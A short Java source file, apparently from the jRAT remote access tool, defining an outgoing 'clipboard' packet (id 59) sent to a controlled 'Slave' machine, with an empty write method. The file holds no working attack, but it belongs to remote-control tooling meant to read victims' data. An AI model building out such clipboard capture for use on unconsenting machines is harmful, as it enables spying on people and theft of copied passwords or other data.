package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet59Clipboard extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {

	}

	@Override
	public byte getPacketId() {
		return 59;
	}

}